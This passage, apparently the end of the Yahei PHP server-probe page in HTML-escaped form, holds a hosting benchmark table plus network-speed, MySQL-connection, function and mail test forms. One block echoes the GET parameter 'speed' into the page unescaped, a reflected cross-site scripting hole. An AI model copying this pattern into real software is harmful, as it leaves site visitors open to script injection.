    &lt;td&gt;0.038秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;4 x Core i7 920 @ 2.67GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;美国 RiZie.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.521秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.559秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.054秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;2 x Pentium4 3.00GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;埃及 CitynetHost.com&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;0.343秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.761秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.023秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;2 x Core2Duo E4600 @ 2.40GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;美国 IXwebhosting.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.535秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.607秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.058秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;4 x Xeon E5530 @ 2.40GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td&gt;本台服务器&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $valInt;?&gt;&lt;br &#x2F;&gt;&lt;input class&#x3D;&quot;btn&quot; name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;整型测试&quot; &#x2F;&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $valFloat;?&gt;&lt;br &#x2F;&gt;&lt;input class&#x3D;&quot;btn&quot; name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;浮点测试&quot; &#x2F;&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $valIo;?&gt;&lt;br &#x2F;&gt;&lt;input class&#x3D;&quot;btn&quot; name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;IO测试&quot; &#x2F;&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;pInt&quot; value&#x3D;&quot;&lt;?php echo $valInt;?&gt;&quot; &#x2F;&gt;

&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;pFloat&quot; value&#x3D;&quot;&lt;?php echo $valFloat;?&gt;&quot; &#x2F;&gt;

&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;pIo&quot; value&#x3D;&quot;&lt;?php echo $valIo;?&gt;&quot; &#x2F;&gt;

&lt;a name&#x3D;&quot;w_networkspeed&quot;&gt;&lt;&#x2F;a&gt;
&lt;!--网络速度测试--&gt;
&lt;table&gt;
	&lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;网络速度测试&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td width&#x3D;&quot;19%&quot; align&#x3D;&quot;center&quot;&gt;&lt;input name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn&quot; value&#x3D;&quot;开始测试&quot; &#x2F;&gt;
        &lt;br &#x2F;&gt;
	向客户端传送1000k字节数据&lt;br &#x2F;&gt;
	带宽比例按理想值计算
	&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;81%&quot; align&#x3D;&quot;center&quot; &gt;

  &lt;table align&#x3D;&quot;center&quot; width&#x3D;&quot;550&quot; border&#x3D;&quot;0&quot; cellspacing&#x3D;&quot;0&quot; cellpadding&#x3D;&quot;0&quot; &gt;
    &lt;tr &gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;带宽&lt;&#x2F;td&gt;
	&lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;1M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;2M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;3M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;4M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;5M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;6M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;7M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;8M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;9M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;10M&lt;&#x2F;td&gt;
    &lt;&#x2F;tr&gt;
   &lt;tr&gt;
    &lt;td colspan&#x3D;&quot;11&quot; class&#x3D;&quot;suduk&quot; &gt;&lt;table align&#x3D;&quot;center&quot; width&#x3D;&quot;550&quot; border&#x3D;&quot;0&quot; cellspacing&#x3D;&quot;0&quot; cellpadding&#x3D;&quot;0&quot; height&#x3D;&quot;8&quot; class&#x3D;&quot;suduk&quot;&gt;
    &lt;tr&gt;
      &lt;td class&#x3D;&quot;sudu&quot;  width&#x3D;&quot;&lt;?php 
	if(preg_match(&quot;&#x2F;[^\d-., ]&#x2F;&quot;,$speed))
		&#123;
			echo &quot;0&quot;;
		&#125;
	else&#123;
			echo 550*($speed&#x2F;11000);
		&#125; 
		?&gt;&quot;&gt;&lt;&#x2F;td&gt;
      &lt;td class&#x3D;&quot;suduk&quot; width&#x3D;&quot;&lt;?php 
	if(preg_match(&quot;&#x2F;[^\d-., ]&#x2F;&quot;,$speed))
		&#123;
			echo &quot;550&quot;;
		&#125;
	else&#123;
			echo 550-550*($speed&#x2F;11000);
		&#125; 
		?&gt;&quot;&gt;&lt;&#x2F;td&gt;
    &lt;&#x2F;tr&gt;
    &lt;&#x2F;table&gt;
   &lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;&#x2F;table&gt;
  &lt;?php echo (isset($_GET[&#39;speed&#39;]))?&quot;下载1000KB数据用时 &lt;font color&#x3D;&#39;#cc0000&#39;&gt;&quot;.$_GET[&#39;speed&#39;].&quot;&lt;&#x2F;font&gt; 毫秒，下载速度：&quot;.&quot;&lt;font color&#x3D;&#39;#cc0000&#39;&gt;&quot;.$speed.&quot;&lt;&#x2F;font&gt;&quot;.&quot; kb&#x2F;s，需测试多次取平均值，超过10M直接看下载速度&quot;:&quot;&lt;font color&#x3D;&#39;#cc0000&#39;&gt;&amp;nbsp;未探测&amp;nbsp;&lt;&#x2F;font&gt;&quot; ?&gt;

    &lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_MySQL&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--MySQL数据库连接检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;MySQL数据库连接检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;15%&quot;&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;60%&quot;&gt;

      地址：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;host&quot; value&#x3D;&quot;localhost&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

      端口：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;port&quot; value&#x3D;&quot;3306&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

      用户名：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;login&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

      密码：&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;25%&quot;&gt;

      &lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;act&quot; value&#x3D;&quot;MySQL检测&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

  &lt;?php

  if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;MySQL检测&#39;) &#123;

  	if(function_exists(&quot;mysql_close&quot;)&#x3D;&#x3D;1) &#123;

  		$link &#x3D; @mysql_connect($host.&quot;:&quot;.$port,$login,$password);

  		if ($link)&#123;

  			echo &quot;&lt;script&gt;alert(&#39;连接到MySql数据库正常&#39;)&lt;&#x2F;script&gt;&quot;;

  		&#125; else &#123;

  			echo &quot;&lt;script&gt;alert(&#39;无法连接到MySql数据库！&#39;)&lt;&#x2F;script&gt;&quot;;

  		&#125;

  	&#125; else &#123;

  		echo &quot;&lt;script&gt;alert(&#39;服务器不支持MySQL数据库！&#39;)&lt;&#x2F;script&gt;&quot;;

  	&#125;

  &#125;

	?&gt;
	
&lt;a name&#x3D;&quot;w_function&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--函数检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;函数检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;15%&quot;&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;60%&quot;&gt;

      请输入您要检测的函数：

      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;funName&quot; size&#x3D;&quot;50&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;25%&quot;&gt;

      &lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;act&quot; align&#x3D;&quot;right&quot; value&#x3D;&quot;函数检测&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;?php

  if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;函数检测&#39;) &#123;

  	echo &quot;&lt;script&gt;alert(&#39;$funRe&#39;)&lt;&#x2F;script&gt;&quot;;

  &#125;

  ?&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_mail&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--邮件发送检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;邮件发送检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;15%&quot;&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;60%&quot;&gt;

      请输入您要检测的邮件地址：

      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mailAdd&quot; size&#x3D;&quot;50&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;25%&quot;&gt;

    &lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;act&quot; value&#x3D;&quot;邮件检测&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;?php

  if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;邮件检测&#39;) &#123;

  	echo &quot;&lt;script&gt;alert(&#39;$mailRe&#39;)&lt;&#x2F;script&gt;&quot;;

  &#125;

  ?&gt;

&lt;&#x2F;table&gt;

&lt;&#x2F;form&gt;



	&lt;table&gt;
		&lt;tr&gt;
			&lt;td class&#x3D;&quot;w_foot&quot;&gt;&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;www.Yahei.Net&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;?php echo $title.$version;?&gt;&lt;&#x2F;A&gt;&lt;&#x2F;td&gt;
			&lt;td class&#x3D;&quot;w_foot&quot;&gt;&lt;?php $run_time &#x3D; sprintf(&#39;%0.4f&#39;, microtime_float() - $time_start);?&gt;Processed in &lt;?php echo $run_time?&gt; seconds. &lt;?php echo memory_usage();?&gt; memory usage.&lt;&#x2F;td&gt;
			&lt;td class&#x3D;&quot;w_foot&quot;&gt;&lt;a href&#x3D;&quot;#w_top&quot;&gt;返回顶部&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
		&lt;&#x2F;tr&gt;
	&lt;&#x2F;table&gt;

&lt;&#x2F;div&gt;

&lt;&#x2F;body&gt;

&lt;&#x2F;html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><s